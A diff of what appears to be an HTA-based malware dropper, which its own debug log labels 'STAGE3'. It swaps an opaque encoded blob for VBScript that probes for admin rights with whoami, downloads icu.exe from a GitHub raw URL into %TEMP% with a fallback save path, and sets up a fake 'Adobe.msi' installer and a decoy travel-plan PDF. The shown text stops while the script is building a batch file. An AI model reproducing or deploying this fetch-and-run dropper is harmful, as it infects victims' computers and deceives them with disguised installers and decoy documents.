@@ -1,1 +1,303 @@
-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
+Dim fso, sh, qs, selfPath, isAdmin, http, stream, dbg
+Dim icuUrl, msiUrl, pdfUrl
+Dim tmpExe, msiPath, pdfPath, logFile
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set sh  = CreateObject("WScript.Shell")
+qs  = Chr(34)
+
+logFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\s3_debug.txt"
+Set dbg = fso.OpenTextFile(logFile, 8, True)
+dbg.WriteLine "=================================================="
+dbg.WriteLine "STAGE3 DEBUG - " & Now
+dbg.WriteLine "=================================================="
+
+icuUrl = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/icu.exe"
+msiUrl = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
+pdfUrl = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
+
+selfPath = location.href
+selfPath = Replace(selfPath, "file:///", "")
+selfPath = Replace(selfPath, "%20", " ")
+selfPath = Replace(selfPath, "/", "\")
+dbg.WriteLine "[SELF] selfPath = " & selfPath
+
+' ---- admin probe ----
+dbg.WriteLine "[PROBE] running whoami /groups..."
+isAdmin = False
+Dim tmpOut, fIn, contents
+tmpOut = sh.ExpandEnvironmentStrings("%TEMP%") & "\_p.txt"
+On Error Resume Next
+sh.Run "%COMSPEC% /c whoami /groups > " & qs & tmpOut & qs, 0, True
+Err.Clear
+On Error GoTo 0
+
+If fso.FileExists(tmpOut) Then
+    Set fIn = fso.OpenTextFile(tmpOut, 1)
+    contents = fIn.ReadAll
+    fIn.Close
+    If InStr(contents, "S-1-16-12288") > 0 Then isAdmin = True
+    fso.DeleteFile tmpOut, True
+    dbg.WriteLine "[PROBE] isAdmin = " & isAdmin
+Else
+    dbg.WriteLine "[PROBE] whoami output file NOT FOUND"
+End If
+
+' ============================================================
+'  NOT ADMIN
+' ============================================================
+If Not isAdmin Then
+    dbg.WriteLine "[BRANCH] NOT ADMIN - firing icu.exe"
+    tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
+
+    On Error Resume Next
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", icuUrl, False
+    http.Send
+    Err.Clear
+    On Error GoTo 0
+    dbg.WriteLine "[ICU] http status: " & http.Status
+    dbg.WriteLine "[ICU] http body  : " & LenB(http.ResponseBody) & " bytes"
+
+    If http.Status = 200 Then
+        Dim icuSaved
+        icuSaved = False
+
+        On Error Resume Next
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile tmpExe, 2
+        If Err.Number <> 0 Then dbg.WriteLine "[ICU] save err: " & Err.Number
+        Err.Clear
+        stream.Close
+        On Error GoTo 0
+
+        If fso.FileExists(tmpExe) Then
+            icuSaved = True
+            dbg.WriteLine "[ICU] saved: " & fso.GetFile(tmpExe).Size & " bytes"
+        Else
+            dbg.WriteLine "[ICU] direct save FAILED - VBS fallback"
+            Dim xmlDoc, binNode, byteArray
+            On Error Resume Next
+            Set xmlDoc = CreateObject("MSXML2.DOMDocument")
+            Set binNode = xmlDoc.createElement("b")
+            binNode.dataType = "bin:base64"
+            binNode.nodeTypedValue = http.ResponseBody
+            If Err.Number = 0 Then
+                byteArray = binNode.nodeTypedValue
+                Dim st
+                Set st = CreateObject("ADODB.Stream")
+                st.Type = 1
+                st.Open
+                st.Write byteArray
+                st.SaveToFile tmpExe, 2
+                st.Close
+            End If
+            Err.Clear
+            On Error GoTo 0
+            If fso.FileExists(tmpExe) Then 
+                icuSaved = True
+                dbg.WriteLine "[ICU] VBS fallback saved: " & fso.GetFile(tmpExe).Size & " bytes"
+            End If
+        End If
+
+        If icuSaved Then
+            Dim batPath, batContent, bf, shortBat
+            batPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat"
